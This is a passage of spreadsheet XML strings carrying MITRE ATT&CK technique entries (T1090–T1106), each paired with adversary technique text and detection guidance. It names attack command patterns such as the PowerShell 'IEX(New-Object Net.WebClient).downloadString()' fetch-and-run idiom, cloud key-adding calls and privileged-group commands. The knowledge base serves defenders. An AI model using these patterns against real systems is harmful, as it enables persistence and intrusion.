  <si>
    <t>Adversaries may use an external proxy to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to provide resiliency in the face of connection loss, or to ride over existing trusted communications paths to avoid suspicion.
External connection proxies are used to mask the destination of C2 traffic and are typically implemented with port redirectors. Compromised systems outside of the victim environment may be used for these purposes, as well as purchased infrastructure such as cloud-based resources or virtual private servers. Proxies may be chosen based on the low likelihood that a connection to them from a compromised system would be investigated. Victim systems would communicate directly with the external proxy on the Internet and then the proxy would forward communications to the C2 server.</t>
  </si>
  <si>
    <t>Analyze network data for uncommon data flows, such as a client sending significantly more data than it receives from an external server. Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.(Citation: University of Birmingham C2)</t>
  </si>
  <si>
    <t>T1090.003</t>
  </si>
  <si>
    <t>Multi-hop Proxy (T1090.003)</t>
  </si>
  <si>
    <t>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malicious traffic through several proxies to identify its source.
For example, adversaries may construct or use onion routing networks – such as the publicly available [Tor](https://attack.mitre.org/software/S0183) network – to transport encrypted C2 traffic through a compromised population, allowing communication with any device within the network.(Citation: Onion Routing) Adversaries may also use operational relay box (ORB) networks composed of virtual private servers (VPS), Internet of Things (IoT) devices, smart devices, and end-of-life routers to obfuscate their operations. (Citation: ORB Mandiant) 
In the case of network infrastructure, it is possible for an adversary to leverage multiple compromised devices to create a multi-hop proxy chain (i.e., [Network Devices](https://attack.mitre.org/techniques/T1584/008)). By leveraging [Patch System Image](https://attack.mitre.org/techniques/T1601/001) on routers, adversaries can add custom code to the affected network devices that will implement onion routing between those nodes. This method is dependent upon the [Network Boundary Bridging](https://attack.mitre.org/techniques/T1599) method allowing the adversaries to cross the protected network boundary of the Internet perimeter and into the organization’s Wide-Area Network (WAN).  Protocols such as ICMP may be used as a transport.  
Similarly, adversaries may abuse peer-to-peer (P2P) and blockchain-oriented infrastructure to implement routing between a decentralized network of peers.(Citation: NGLite Trojan)</t>
  </si>
  <si>
    <t>When observing use of Multi-hop proxies, network data from the actual command and control servers could allow correlating incoming and outgoing flows to trace malicious traffic back to its source. Multi-hop proxies can also be detected by alerting on traffic to known anonymity networks (such as [Tor](https://attack.mitre.org/software/S0183)) or known adversary infrastructure that uses this technique.
In context of network devices, monitor traffic for encrypted communications from the Internet that is addressed to border routers.  Compare this traffic with the configuration to determine whether it matches with any configured site-to-site Virtual Private Network (VPN) connections the device was intended to have. Monitor traffic for encrypted communications originating from potentially breached routers that is addressed to other routers within the organization.  Compare the source and destination with the configuration of the device to determine if these channels are an authorized Virtual Private Network (VPN) connections or other encrypted modes of communication. Monitor ICMP traffic from the Internet that is addressed to border routers and is encrypted.  Few if any legitimate use cases exist for sending encrypted data to a network device via ICMP.</t>
  </si>
  <si>
    <t>T1090.004</t>
  </si>
  <si>
    <t>Adversaries may take advantage of routing schemes in Content Delivery Networks (CDNs) and other services which host multiple domains to obfuscate the intended destination of HTTPS traffic or traffic tunneled through HTTPS. (Citation: Fifield Blocking Resistent Communication through domain fronting 2015) Domain fronting involves using different domain names in the SNI field of the TLS header and the Host field of the HTTP header. If both domains are served from the same CDN, then the CDN may route to the address specified in the HTTP header after unwrapping the TLS header. A variation of the the technique, "domainless" fronting, utilizes a SNI field that is left blank; this may allow the fronting to work even when the CDN attempts to validate that the SNI and HTTP Host fields match (if the blank SNI fields are ignored).
For example, if domain-x and domain-y are customers of the same CDN, it is possible to place domain-x in the TLS header and domain-y in the HTTP header. Traffic will appear to be going to domain-x, however the CDN may route it to domain-y.</t>
  </si>
  <si>
    <t>If SSL inspection is in place or the traffic is not encrypted, the Host field of the HTTP header can be checked if it matches the HTTPS SNI or against a blocklist or allowlist of domain names. (Citation: Fifield Blocking Resistent Communication through domain fronting 2015)</t>
  </si>
  <si>
    <t>T1091</t>
  </si>
  <si>
    <t>Initial Access, Lateral Movement</t>
  </si>
  <si>
    <t>Drive: Drive Creation, File: File Access, File: File Creation, Process: Process Creation</t>
  </si>
  <si>
    <t>Adversaries may move onto systems, possibly those on disconnected or air-gapped networks, by copying malware to removable media and taking advantage of Autorun features when the media is inserted into a system and executes. In the case of Lateral Movement, this may occur through modification of executable files stored on removable media or by copying malware and renaming it to look like a legitimate file to trick users into executing it on a separate system. In the case of Initial Access, this may occur through manual manipulation of the media, modification of systems used to initially format the media, or modification to the media's firmware itself.
Mobile devices may also be used to infect PCs with malware if connected via USB.(Citation: Exploiting Smartphone USB ) This infection may be achieved using devices (Android, iOS, etc.) and, in some instances, USB charging cables.(Citation: Windows Malware Infecting Android)(Citation: iPhone Charging Cable Hack) For example, when a smartphone is connected to a system, it may appear to be mounted similar to a USB-connected disk drive. If malware that is compatible with the connected system is on the mobile device, the malware could infect the machine (especially if Autorun features are enabled).</t>
  </si>
  <si>
    <t>Monitor file access on removable media. Detect processes that execute from removable media after it is mounted or when initiated by a user. If a remote access tool is used in this manner to move laterally, then additional actions are likely to occur after execution, such as opening network connections for Command and Control and system and network information Discovery.</t>
  </si>
  <si>
    <t>T1092</t>
  </si>
  <si>
    <t>Drive: Drive Access, Drive: Drive Creation</t>
  </si>
  <si>
    <t>Adversaries can perform command and control between compromised hosts on potentially disconnected networks using removable media to transfer commands from system to system.(Citation: ESET Sednit USBStealer 2014) Both systems would need to be compromised, with the likelihood that an Internet-connected system was compromised first and the second through lateral movement by [Replication Through Removable Media](https://attack.mitre.org/techniques/T1091). Commands and files would be relayed from the disconnected system to the Internet-connected system to which the adversary has direct access.</t>
  </si>
  <si>
    <t>Monitor file access on removable media. Detect processes that execute when removable media is mounted.</t>
  </si>
  <si>
    <t>T1095</t>
  </si>
  <si>
    <t>Adversaries may use an OSI non-application layer protocol for communication between host and C2 server or among infected hosts within a network. The list of possible protocols is extensive.(Citation: Wikipedia OSI) Specific examples include use of network layer protocols, such as the Internet Control Message Protocol (ICMP), transport layer protocols, such as the User Datagram Protocol (UDP), session layer protocols, such as Socket Secure (SOCKS), as well as redirected/tunneled protocols, such as Serial over LAN (SOL).
ICMP communication between hosts is one example.(Citation: Cisco Synful Knock Evolution) Because ICMP is part of the Internet Protocol Suite, it is required to be implemented by all IP-compatible hosts.(Citation: Microsoft ICMP) However, it is not as commonly monitored as other Internet Protocols such as TCP or UDP and may be used by adversaries to hide communications.</t>
  </si>
  <si>
    <t>Analyze network traffic for ICMP messages or other protocols that contain abnormal data or are not normally seen within or exiting the network.(Citation: Cisco Blog Legacy Device Attacks)
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communications that do not follow the expected protocol behavior for the port that is being used.(Citation: University of Birmingham C2) 
Monitor and investigate API calls to functions associated with enabling and/or utilizing alternative communication channels.</t>
  </si>
  <si>
    <t>T1098</t>
  </si>
  <si>
    <t>Active Directory: Active Directory Object Modification, Command: Command Execution, File: File Modification, Group: Group Modification, Process: Process Creation, User Account: User Account Modification</t>
  </si>
  <si>
    <t>Adversaries may manipulate accounts to maintain and/or elevate access to victim systems. Account manipulation may consist of any action that preserves or modifies adversary access to a compromised account, such as modifying credentials or permission groups.(Citation: FireEye SMOKEDHAM June 2021) These actions could also include account activity designed to subvert security policies, such as performing iterative password updates to bypass password duration policies and preserve the life of compromised credentials. 
In order to create or manipulate accounts, the adversary must already have sufficient permissions on systems or the domain. However, account manipulation may also lead to privilege escalation where modifications grant access to additional roles, permissions, or higher-privileged [Valid Accounts](https://attack.mitre.org/techniques/T1078).</t>
  </si>
  <si>
    <t>Collect events that correlate with changes to account objects and/or permissions on systems and the domain, such as event IDs 4738, 4728 and 4670.(Citation: Microsoft User Modified Event)(Citation: Microsoft Security Event 4670)(Citation: Microsoft Security Event 4670) Monitor for modification of accounts in correlation with other suspicious activity. Changes may occur at unusual times or from unusual systems. Especially flag events where the subject and target accounts differ(Citation: InsiderThreat ChangeNTLM July 2017) or that include additional flags such as changing a password without knowledge of the old password.(Citation: GitHub Mimikatz Issue 92 June 2017)
Monitor for use of credentials at unusual times or to unusual systems or services. This may also correlate with other suspicious activity.
Monitor for unusual permissions changes that may indicate excessively broad permissions being granted to compromised accounts. However, account manipulation may also lead to privilege escalation where modifications grant access to additional roles, permissions, or higher-privileged [Valid Accounts](https://attack.mitre.org/techniques/T1078)</t>
  </si>
  <si>
    <t>T1098.001</t>
  </si>
  <si>
    <t>Active Directory: Active Directory Object Creation, Active Directory: Active Directory Object Modification, User Account: User Account Modification</t>
  </si>
  <si>
    <t>IaaS, Identity Provider, SaaS</t>
  </si>
  <si>
    <t>Adversaries may add adversary-controlled credentials to a cloud account to maintain persistent access to victim accounts and instances within the environment.
For example, adversaries may add credentials for Service Principals and Applications in addition to existing legitimate credentials in Azure / Entra ID.(Citation: Microsoft SolarWinds Customer Guidance)(Citation: Blue Cloud of Death)(Citation: Blue Cloud of Death Video) These credentials include both x509 keys and passwords.(Citation: Microsoft SolarWinds Customer Guidance) With sufficient permissions, there are a variety of ways to add credentials including the Azure Portal, Azure command line interface, and Azure or Az PowerShell modules.(Citation: Demystifying Azure AD Service Principals)
In infrastructure-as-a-service (IaaS) environments, after gaining access through [Cloud Accounts](https://attack.mitre.org/techniques/T1078/004), adversaries may generate or import their own SSH keys using either the &lt;code&gt;CreateKeyPair&lt;/code&gt; or &lt;code&gt;ImportKeyPair&lt;/code&gt; API in AWS or the &lt;code&gt;gcloud compute os-login ssh-keys add&lt;/code&gt; command in GCP.(Citation: GCP SSH Key Add) This allows persistent access to instances within the cloud environment without further usage of the compromised cloud accounts.(Citation: Expel IO Evil in AWS)(Citation: Expel Behind the Scenes)
Adversaries may also use the &lt;code&gt;CreateAccessKey&lt;/code&gt; API in AWS or the &lt;code&gt;gcloud iam service-accounts keys create&lt;/code&gt; command in GCP to add access keys to an account. Alternatively, they may use the &lt;code&gt;CreateLoginProfile&lt;/code&gt; API in AWS to add a password that can be used to log into the AWS Management Console for [Cloud Service Dashboard](https://attack.mitre.org/techniques/T1538).(Citation: Permiso Scattered Spider 2023)(Citation: Lacework AI Resource Hijacking 2024) If the target account has different permissions from the requesting account, the adversary may also be able to escalate their privileges in the environment (i.e. [Cloud Accounts](https://attack.mitre.org/techniques/T1078/004)).(Citation: Rhino Security Labs AWS Privilege Escalation)(Citation: Sysdig ScarletEel 2.0) For example, in Entra ID environments, an adversary with the Application Administrator role can add a new set of credentials to their application's service principal. In doing so the adversary would be able to access the service principal’s roles and permissions, which may be different from those of the Application Administrator.(Citation: SpecterOps Azure Privilege Escalation) 
In AWS environments, adversaries with the appropriate permissions may also use the `sts:GetFederationToken` API call to create a temporary set of credentials to [Forge Web Credentials](https://attack.mitre.org/techniques/T1606) tied to the permissions of the original user account. These temporary credentials may remain valid for the duration of their lifetime even if the original account’s API credentials are deactivated.
(Citation: Crowdstrike AWS User Federation Persistence)
In Entra ID environments with the app password feature enabled, adversaries may be able to add an app password to a user account.(Citation: Mandiant APT42 Operations 2024) As app passwords are intended to be used with legacy devices that do not support multi-factor authentication (MFA), adding an app password can allow an adversary to bypass MFA requirements. Additionally, app passwords may remain valid even if the user’s primary password is reset.(Citation: Microsoft Entra ID App Passwords)</t>
  </si>
  <si>
    <t>Monitor Azure Activity Logs for Service Principal and Application modifications. Monitor for the usage of APIs that create or import SSH keys, particularly by unexpected users or accounts such as the root account.
Monitor for use of credentials at unusual times or to unusual systems or services. This may also correlate with other suspicious activity.</t>
  </si>
  <si>
    <t>T1098.002</t>
  </si>
  <si>
    <t>Application Log: Application Log Content, Group: Group Modification, User Account: User Account Modification</t>
  </si>
  <si>
    <t>Adversaries may grant additional permission levels to maintain persistent access to an adversary-controlled email account. 
For example, the &lt;code&gt;Add-MailboxPermission&lt;/code&gt; [PowerShell](https://attack.mitre.org/techniques/T1059/001) cmdlet, available in on-premises Exchange and in the cloud-based service Office 365, adds permissions to a mailbox.(Citation: Microsoft - Add-MailboxPermission)(Citation: FireEye APT35 2018)(Citation: Crowdstrike Hiding in Plain Sight 2018) In Google Workspace, delegation can be enabled via the Google Admin console and users can delegate accounts via their Gmail settings.(Citation: Gmail Delegation)(Citation: Google Ensuring Your Information is Safe) 
Adversaries may also assign mailbox folder permissions through individual folder permissions or roles. In Office 365 environments, adversaries may assign the Default or Anonymous user permissions or roles to the Top of Information Store (root), Inbox, or other mailbox folders. By assigning one or both user permissions to a folder, the adversary can utilize any other account in the tenant to maintain persistence to the target user’s mail folders.(Citation: Mandiant Defend UNC2452 White Paper)
This may be used in persistent threat incidents as well as BEC (Business Email Compromise) incidents where an adversary can add [Additional Cloud Roles](https://attack.mitre.org/techniques/T1098/003) to the accounts they wish to compromise. This may further enable use of additional techniques for gaining access to systems. For example, compromised business accounts are often used to send messages to other accounts in the network of the target business while creating inbox rules (ex: [Internal Spearphishing](https://attack.mitre.org/techniques/T1534)), so the messages evade spam/phishing detection mechanisms.(Citation: Bienstock, D. - Defending O365 - 2019)</t>
  </si>
  <si>
    <t>Monitor for unusual Exchange and Office 365 email account permissions changes that may indicate excessively broad permissions being granted to compromised accounts.
Enable the UpdateFolderPermissions action for all logon types. The mailbox audit log will forward folder permission modification events to the Unified Audit Log. Create rules to alert on ModifyFolderPermissions operations where the Anonymous or Default user is assigned permissions other than None. 
A larger than normal volume of emails sent from an account and similar phishing emails sent from  real accounts within a network may be a sign that an account was compromised and attempts to leverage access with modified email permissions is occurring.</t>
  </si>
  <si>
    <t>T1098.003</t>
  </si>
  <si>
    <t>User Account: User Account Modification</t>
  </si>
  <si>
    <t>An adversary may add additional roles or permissions to an adversary-controlled cloud account to maintain persistent access to a tenant. For example, adversaries may update IAM policies in cloud-based environments or add a new global administrator in Office 365 environments.(Citation: AWS IAM Policies and Permissions)(Citation: Google Cloud IAM Policies)(Citation: Microsoft Support O365 Add Another Admin, October 2019)(Citation: Microsoft O365 Admin Roles) With sufficient permissions, a compromised account can gain almost unlimited access to data and settings (including the ability to reset the passwords of other admins).(Citation: Expel AWS Attacker)
(Citation: Microsoft O365 Admin Roles) 
This account modification may immediately follow [Create Account](https://attack.mitre.org/techniques/T1136) or other malicious account activity. Adversaries may also modify existing [Valid Accounts](https://attack.mitre.org/techniques/T1078) that they have compromised. This could lead to privilege escalation, particularly if the roles added allow for lateral movement to additional accounts.
For example, in AWS environments, an adversary with appropriate permissions may be able to use the &lt;code&gt;CreatePolicyVersion&lt;/code&gt; API to define a new version of an IAM policy or the &lt;code&gt;AttachUserPolicy&lt;/code&gt; API to attach an IAM policy with additional or distinct permissions to a compromised user account.(Citation: Rhino Security Labs AWS Privilege Escalation)
In some cases, adversaries may add roles to adversary-controlled accounts outside the victim cloud tenant. This allows these external accounts to perform actions inside the victim tenant without requiring the adversary to [Create Account](https://attack.mitre.org/techniques/T1136) or modify a victim-owned account.(Citation: Invictus IR DangerDev 2024)</t>
  </si>
  <si>
    <t xml:space="preserve">Collect activity logs from IAM services and cloud administrator accounts to identify unusual activity in the assignment of roles to those accounts. Monitor for accounts assigned to admin roles that go over a certain threshold of known admins. </t>
  </si>
  <si>
    <t>T1098.004</t>
  </si>
  <si>
    <t>SSH Authorized Keys (T1098.004)</t>
  </si>
  <si>
    <t>Command: Command Execution, File: File Modification, Process: Process Creation</t>
  </si>
  <si>
    <t>IaaS, Linux, Network, macOS</t>
  </si>
  <si>
    <t>Adversaries may modify the SSH &lt;code&gt;authorized_keys&lt;/code&gt; file to maintain persistence on a victim host. Linux distributions and macOS commonly use key-based authentication to secure the authentication process of SSH sessions for remote management. The &lt;code&gt;authorized_keys&lt;/code&gt; file in SSH specifies the SSH keys that can be used for logging into the user account for which the file is configured. This file is usually found in the user's home directory under &lt;code&gt;&amp;lt;user-home&amp;gt;/.ssh/authorized_keys&lt;/code&gt;.(Citation: SSH Authorized Keys) Users may edit the system’s SSH config file to modify the directives PubkeyAuthentication and RSAAuthentication to the value “yes” to ensure public key and RSA authentication are enabled. The SSH config file is usually located under &lt;code&gt;/etc/ssh/sshd_config&lt;/code&gt;.
Adversaries may modify SSH &lt;code&gt;authorized_keys&lt;/code&gt; files directly with scripts or shell commands to add their own adversary-supplied public keys. In cloud environments, adversaries may be able to modify the SSH authorized_keys file of a particular virtual machine via the command line interface or rest API. For example, by using the Google Cloud CLI’s “add-metadata” command an adversary may add SSH keys to a user account.(Citation: Google Cloud Add Metadata)(Citation: Google Cloud Privilege Escalation) Similarly, in Azure, an adversary may update the authorized_keys file of a virtual machine via a PATCH request to the API.(Citation: Azure Update Virtual Machines) This ensures that an adversary possessing the corresponding private key may log in as an existing user via SSH.(Citation: Venafi SSH Key Abuse)(Citation: Cybereason Linux Exim Worm) It may also lead to privilege escalation where the virtual machine or instance has distinct permissions from the requesting user.
Where authorized_keys files are modified via cloud APIs or command line interfaces, an adversary may achieve privilege escalation on the target virtual machine if they add a key to a higher-privileged user. 
SSH keys can also be added to accounts on network devices, such as with the `ip ssh pubkey-chain` [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) command.(Citation: cisco_ip_ssh_pubkey_ch_cmd)</t>
  </si>
  <si>
    <t>Use file integrity monitoring to detect changes made to the &lt;code&gt;authorized_keys&lt;/code&gt; file for each user on a system. Monitor for suspicious processes modifying the &lt;code&gt;authorized_keys&lt;/code&gt; file. In cloud environments, monitor instances for modification of metadata and configurations.
Monitor for changes to and suspicious processes modifiying &lt;code&gt;/etc/ssh/sshd_config&lt;/code&gt;.
For network infrastructure devices, collect AAA logging to monitor for rogue SSH keys being added to accounts.</t>
  </si>
  <si>
    <t>T1098.005</t>
  </si>
  <si>
    <t>Active Directory: Active Directory Object Creation, Application Log: Application Log Content, User Account: User Account Modification</t>
  </si>
  <si>
    <t>Identity Provider, Windows</t>
  </si>
  <si>
    <t>Adversaries may register a device to an adversary-controlled account. Devices may be registered in a multifactor authentication (MFA) system, which handles authentication to the network, or in a device management system, which handles device access and compliance.
MFA systems, such as Duo or Okta, allow users to associate devices with their accounts in order to complete MFA requirements. An adversary that compromises a user’s credentials may enroll a new device in order to bypass initial MFA requirements and gain persistent access to a network.(Citation: CISA MFA PrintNightmare)(Citation: DarkReading FireEye SolarWinds) In some cases, the MFA self-enrollment process may require only a username and password to enroll the account's first device or to enroll a device to an inactive account. (Citation: Mandiant APT29 Microsoft 365 2022)
Similarly, an adversary with existing access to a network may register a device to Entra ID and/or its device management system, Microsoft Intune, in order to access sensitive data or resources while bypassing conditional access policies.(Citation: AADInternals - Device Registration)(Citation: AADInternals - Conditional Access Bypass)(Citation: Microsoft DEV-0537) 
Devices registered in Entra ID may be able to conduct [Internal Spearphishing](https://attack.mitre.org/techniques/T1534) campaigns via intra-organizational emails, which are less likely to be treated as suspicious by the email client.(Citation: Microsoft - Device Registration) Additionally, an adversary may be able to perform a [Service Exhaustion Flood](https://attack.mitre.org/techniques/T1499/002) on an Entra ID tenant by registering a large number of devices.(Citation: AADInternals - BPRT)</t>
  </si>
  <si>
    <t>T1098.006</t>
  </si>
  <si>
    <t>Additional Container Cluster Roles (T1098.006)</t>
  </si>
  <si>
    <t>An adversary may add additional roles or permissions to an adversary-controlled user or service account to maintain persistent access to a container orchestration system. For example, an adversary with sufficient permissions may create a RoleBinding or a ClusterRoleBinding to bind a Role or ClusterRole to a Kubernetes account.(Citation: Kubernetes RBAC)(Citation: Aquasec Kubernetes Attack 2023) Where attribute-based access control (ABAC) is in use, an adversary with sufficient permissions may modify a Kubernetes ABAC policy to give the target account additional permissions.(Citation: Kuberentes ABAC)
This account modification may immediately follow [Create Account](https://attack.mitre.org/techniques/T1136) or other malicious account activity. Adversaries may also modify existing [Valid Accounts](https://attack.mitre.org/techniques/T1078) that they have compromised.  
Note that where container orchestration systems are deployed in cloud environments, as with Google Kubernetes Engine, Amazon Elastic Kubernetes Service, and Azure Kubernetes Service, cloud-based  role-based access control (RBAC) assignments or ABAC policies can often be used in place of or in addition to local permission assignments.(Citation: Google Cloud Kubernetes IAM)(Citation: AWS EKS IAM Roles for Service Accounts)(Citation: Microsoft Azure Kubernetes Service Service Accounts) In these cases, this technique may be used in conjunction with [Additional Cloud Roles](https://attack.mitre.org/techniques/T1098/003).</t>
  </si>
  <si>
    <t>T1098.007</t>
  </si>
  <si>
    <t>Additional Local or Domain Groups (T1098.007)</t>
  </si>
  <si>
    <t>An adversary may add additional local or domain groups to an adversary-controlled account to maintain persistent access to a system or domain.
On Windows, accounts may use the `net localgroup` and `net group` commands to add existing users to local and domain groups.(Citation: Microsoft Net Localgroup)(Citation: Microsoft Net Group) On Linux, adversaries may use the `usermod` command for the same purpose.(Citation: Linux Usermod)
For example, accounts may be added to the local administrators group on Windows devices to maintain elevated privileges. They may also be added to the Remote Desktop Users group, which allows them to leverage [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001) to log into the endpoints in the future.(Citation: Microsoft RDP Logons) On Linux, accounts may be added to the sudoers group, allowing them to persistently leverage [Sudo and Sudo Caching](https://attack.mitre.org/techniques/T1548/003) for elevated privileges. 
In Windows environments, machine accounts may also be added to domain groups. This allows the local SYSTEM account to gain privileges on the domain.(Citation: RootDSE AD Detection 2022)</t>
  </si>
  <si>
    <t>T1102</t>
  </si>
  <si>
    <t>Adversaries may use an existing, legitimate external Web service as a means for relaying data to/from a compromised system. Popular websites, cloud services, and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google, Microsoft, or Twitter, makes it easier for adversaries to hide in expected noise.(Citation: Broadcom BirdyClient Microsoft Graph API 2024) Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.
Use of Web services may also protect back-end C2 infrastructure from discovery through malware binary analysis while also enabling operational resiliency (since this infrastructure may be dynamically changed).</t>
  </si>
  <si>
    <t>Host data that can relate unknown or suspicious process activity using a network connection is important to supplement any existing indicators of compromise based on malware command and control signatures and infrastructure or the presence of strong encryption. Packet capture analysis will require SSL/TLS inspection if data is encrypted. Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). User behavior monitoring may help to detect abnormal patterns of activity.(Citation: University of Birmingham C2)</t>
  </si>
  <si>
    <t>T1102.001</t>
  </si>
  <si>
    <t>Dead Drop Resolver (T1102.001)</t>
  </si>
  <si>
    <t>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Once infected, victims will reach out to and be redirected by these resolvers.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Use of a dead drop resolver may also protect back-end C2 infrastructure from discovery through malware binary analysis while also enabling operational resiliency (since this infrastructure may be dynamically changed).</t>
  </si>
  <si>
    <t>Host data that can relate unknown or suspicious process activity using a network connection is important to supplement any existing indicators of compromise based on malware command and control signatures and infrastructure or the presence of strong encryption. Packet capture analysis will require SSL/TLS inspection if data is encrypted. User behavior monitoring may help to detect abnormal patterns of activity.(Citation: University of Birmingham C2)</t>
  </si>
  <si>
    <t>T1102.002</t>
  </si>
  <si>
    <t>Bidirectional Communication (T1102.002)</t>
  </si>
  <si>
    <t xml:space="preserve">Adversaries may use an existing, legitimate external Web service as a means for sending commands to and receiving output from a compromised system over the Web service channel. Compromised systems may leverage popular websites and social media to host command and control (C2) instructions. Those infected systems can then send the output from those commands back over that Web service channel. The return traffic may occur in a variety of ways, depending on the Web service being utilized. For example, the return traffic may take the form of the compromised system posting a comment on a forum, issuing a pull request to development project, updating a document hosted on a Web service, or by sending a Tweet.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t>
  </si>
  <si>
    <t>T1102.003</t>
  </si>
  <si>
    <t>One-Way Communication (T1102.003)</t>
  </si>
  <si>
    <t>Adversaries may use an existing, legitimate external Web service as a means for sending commands to a compromised system without receiving return output over the Web service channel. Compromised systems may leverage popular websites and social media to host command and control (C2) instructions. Those infected systems may opt to send the output from those commands back over a different C2 channel, including to another distinct Web service. Alternatively, compromised systems may return no output at all in cases where adversaries want to send instructions to systems and do not want a response.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t>
  </si>
  <si>
    <t>Host data that can relate unknown or suspicious process activity using a network connection is important to supplement any existing indicators of compromise based on malware command and control signatures and infrastructure or the presence of strong encryption. Packet capture analysis will require SSL/TLS inspection if data is encrypted. Analyze network data for uncommon data flows. User behavior monitoring may help to detect abnormal patterns of activity.(Citation: University of Birmingham C2)</t>
  </si>
  <si>
    <t>T1104</t>
  </si>
  <si>
    <t>Adversaries may create multiple stages for command and control that are employed under different conditions or for certain functions. Use of multiple stages may obfuscate the command and control channel to make detection more difficult.
Remote access tools will call back to the first-stage command and control server for instructions. The first stage may have automated capabilities to collect basic host information, update tools, and upload additional files. A second remote access tool (RAT) could be uploaded at that point to redirect the host to the second-stage command and control server. The second stage will likely be more fully featured and allow the adversary to interact with the system through a reverse shell and additional RAT features.
The different stages will likely be hosted separately with no overlapping infrastructure. The loader may also have backup first-stage callbacks or [Fallback Channels](https://attack.mitre.org/techniques/T1008) in case the original first-stage communication path is discovered and blocked.</t>
  </si>
  <si>
    <t>Host data that can relate unknown or suspicious process activity using a network connection is important to supplement any existing indicators of compromise based on malware command and control signatures and infrastructure. Relating subsequent actions that may result from Discovery of the system and network information or Lateral Movement to the originating process may also yield useful data.</t>
  </si>
  <si>
    <t>T1105</t>
  </si>
  <si>
    <t>Command: Command Execution, File: File Creation, Network Traffic: Network Connection Creation, Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow</t>
  </si>
  <si>
    <t>Adversaries may transfer tools or other files from an external system into a compromised environment. Tools or files may be copied from an external adversary-controlled system to the victim network through the command and control channel or through alternate protocols such as [ftp](https://attack.mitre.org/software/S0095). Once present, adversaries may also transfer/spread tools between victim devices within a compromised environment (i.e. [Lateral Tool Transfer](https://attack.mitre.org/techniques/T1570)). 
On Windows, adversaries may use various utilities to download tools, such as `copy`, `finger`, [certutil](https://attack.mitre.org/software/S0160), and [PowerShell](https://attack.mitre.org/techniques/T1059/001) commands such as &lt;code&gt;IEX(New-Object Net.WebClient).downloadString()&lt;/code&gt; and &lt;code&gt;Invoke-WebRequest&lt;/code&gt;. On Linux and macOS systems, a variety of utilities also exist, such as `curl`, `scp`, `sftp`, `tftp`, `rsync`, `finger`, and `wget`.(Citation: t1105_lolbas)
Adversaries may also abuse installers and package managers, such as `yum` or `winget`, to download tools to victim hosts. Adversaries have also abused file application features, such as the Windows `search-ms` protocol handler, to deliver malicious files to victims through remote file searches invoked by [User Execution](https://attack.mitre.org/techniques/T1204) (typically after interacting with [Phishing](https://attack.mitre.org/techniques/T1566) lures).(Citation: T1105: Trellix_search-ms)
Files can also be transferred using various [Web Service](https://attack.mitre.org/techniques/T1102)s as well as native or otherwise present tools on the victim system.(Citation: PTSecurity Cobalt Dec 2016) In some cases, adversaries may be able to leverage services that sync between a web-based and an on-premises client, such as Dropbox or OneDrive, to transfer files onto victim systems. For example, by compromising a cloud account and logging into the service's web portal, an adversary may be able to trigger an automatic syncing process that transfers the file onto the victim's machine.(Citation: Dropbox Malware Sync)</t>
  </si>
  <si>
    <t>Monitor for file creation and files transferred into the network. Unusual processes with external network connections creating files on-system may be suspicious. Use of utilities, such as [ftp](https://attack.mitre.org/software/S0095), that does not normally occur may also be suspicious.
Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Specifically, for the finger utility on Windows and Linux systems, monitor command line or terminal execution for the finger command. Monitor network activity for TCP port 79, which is used by the finger utility, and Windows &lt;code&gt;netsh interface portproxy&lt;/code&gt; modifications to well-known ports such as 80 and 443. Furthermore, monitor file system for the download/creation and execution of suspicious files, which may indicate adversary-downloaded payloads. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.(Citation: University of Birmingham C2)</t>
  </si>
  <si>
    <t>T1106</t>
  </si>
  <si>
    <t>Adversaries may interact with the native OS application programming interface (API) to execute behaviors. Native APIs provide a controlled means of calling low-level OS services within the kernel, such as those involving hardware/devices, memory, and processes.(Citation: NT API Windows)(Citation: Linux Kernel API) These native APIs are leveraged by the OS during system boot (when other system components are not yet initialized) as well as carrying out tasks and requests during routine operations.
Adversaries may abuse these OS API functions as a means of executing behaviors. Similar to [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059), the native API and its hierarchy of interfaces provide mechanisms to interact with and utilize various components of a victimized system.
Native API functions (such as &lt;code&gt;NtCreateProcess&lt;/code&gt;) may be directed invoked via system calls / syscalls, but these features are also often exposed to user-mode applications via interfaces and libraries.(Citation: OutFlank System Calls)(Citation: CyberBit System Calls)(Citation: MDSec System Calls) For example, functions such as the Windows API &lt;code&gt;CreateProcess()&lt;/code&gt; or GNU &lt;code&gt;fork()&lt;/code&gt; will allow programs and scripts to start other processes.(Citation: Microsoft CreateProcess)(Citation: GNU Fork) This may allow API callers to execute a binary, run a CLI command, load modules, etc. as thousands of similar API functions exist for various system operations.(Citation: Microsoft Win32)(Citation: LIBC)(Citation: GLIBC)
Higher level software frameworks, such as Microsoft .NET and macOS Cocoa, are also available to interact with native APIs. These frameworks typically provide language wrappers/abstractions to API functionalities and are designed for ease-of-use/portability of code.(Citation: Microsoft NET)(Citation: Apple Core Services)(Citation: MACOS Cocoa)(Citation: macOS Foundation)
Adversaries may use assembly to directly or in-directly invoke syscalls in an attempt to subvert defensive sensors and detection signatures such as user mode API-hooks.(Citation: Redops Syscalls) Adversaries may also attempt to tamper with sensors and defensive tools associated with API monitoring, such as unhooking monitored functions via [Disable or Modify Tools](https://attack.mitre.org/techniques/T1562/001).</t>
  </si>
  <si>
    <t xml:space="preserve">Monitoring API calls may generate a significant amount of data and may not be useful for defense unless collected under specific circumstances, since benign use of API functions are common and may be difficult to distinguish from malicious behavior. Correlation of other events with behavior surrounding API function calls using API monitoring will provide additional context to an event that may assist in determining if it is due to malicious behavior. Correlation of activity by process lineage by process ID may be sufficient. 
Utilization of the Windows APIs may involve processes loading/accessing system DLLs associated with providing called functions (ex: ntdll.dll, kernel32.dll, advapi32.dll, user32.dll, and gdi32.dll). Monitoring for DLL loads, especially to abnormal/unusual or potentially malicious processes, may indicate abuse of the Windows API. Though noisy, this data can be combined with other indicators to identify adversary activity. </t>
  </si>
  <si>
    <t>T1110</t>
  </si>
  <si>
